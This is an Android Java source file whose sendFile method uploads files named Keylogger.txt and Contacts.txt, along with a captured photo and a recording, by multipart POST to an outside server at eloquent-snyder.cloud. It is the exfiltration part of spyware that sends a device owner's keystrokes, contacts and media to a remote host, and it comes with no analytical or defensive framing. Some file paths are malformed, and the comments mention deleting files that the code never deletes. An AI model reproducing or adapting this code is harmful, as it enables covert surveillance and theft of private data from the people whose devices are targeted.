package com.example.project;

import android.content.Context;
import android.util.Log;

import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class okHTTP3 {
    OkHttpClient client = new OkHttpClient();
    OkHttpClient client1 = new OkHttpClient();
    OkHttpClient client2 = new OkHttpClient();
    OkHttpClient client3 = new OkHttpClient();

    public void sendFile(Context context){
        String filepath = "/data/data/com.example.project/files/Keylogger.txt";
        String filepath1 = "/data/data/com.example.project/files/Contacts.txt";
        String filepath2 = "/data/data/com.example.project/filestest.jpg";
        String filepath3 = "/data/data/com.example.project/filesrecordTest.mp4";
        String url = "https://eloquent-snyder.cloud/receivefile.php";
        File file = new File(filepath);
        File file1 = new File(filepath1);
        File file2 = new File(filepath2);
        File file3 = new File(filepath3);
        RequestBody fileBody = RequestBody.create(MediaType.parse("application/octet-stream"), file);
        RequestBody fileBody1 = RequestBody.create(MediaType.parse("application/octet-stream"), file1);
        RequestBody fileBody2 = RequestBody.create(MediaType.parse("image/jpeg"), file2);
        RequestBody fileBody3 = RequestBody.create(MediaType.parse("audio/mp4"), file3);

        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file.getName(), fileBody)
                .build();
        RequestBody requestBody1 = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file1.getName(), fileBody1)
                .build();
        RequestBody requestBody2 = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file2.getName(), fileBody2)
                .build();
        RequestBody requestBody3 = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file3.getName(), fileBody3)
                .build();


        Request request = new Request.Builder()
                .url(url)
                .post(requestBody)
                .build();
        Request request1 = new Request.Builder()
                .url(url)
                .post(requestBody1)
                .build();
        Request request2 = new Request.Builder()
                .url(url)
                .post(requestBody2)
                .build();
        Request request3 = new Request.Builder()
                .url(url)
                .post(requestBody3)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) {
                    // Handle the failure
                    throw new IOException("Unexpected code " + response);
                }
                // Delete the file if the response was successful
                Log.i("send","sent");
            }
        });

        client1.newCall(request1).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) {
                    // Handle the failure
                    throw new IOException("Unexpected code " + response);
                }
                // Delete the file if the response was successful
                Log.i("send","sent");
            }
        });
        client2.newCall(request2).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) {
                    // Handle the failure
                    throw new IOException("Unexpected code " + response);
                }
                // Delete the file if the response was successful
                Log.i("send","sent");
            }
        });

        client3.newCall(request3).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) {
                    // Handle the failure
                    throw new IOException("Unexpected code " + response);
                }
                // Delete the file if the response was successful
                Log.i("send", "sent");
            }
        });
    }
}
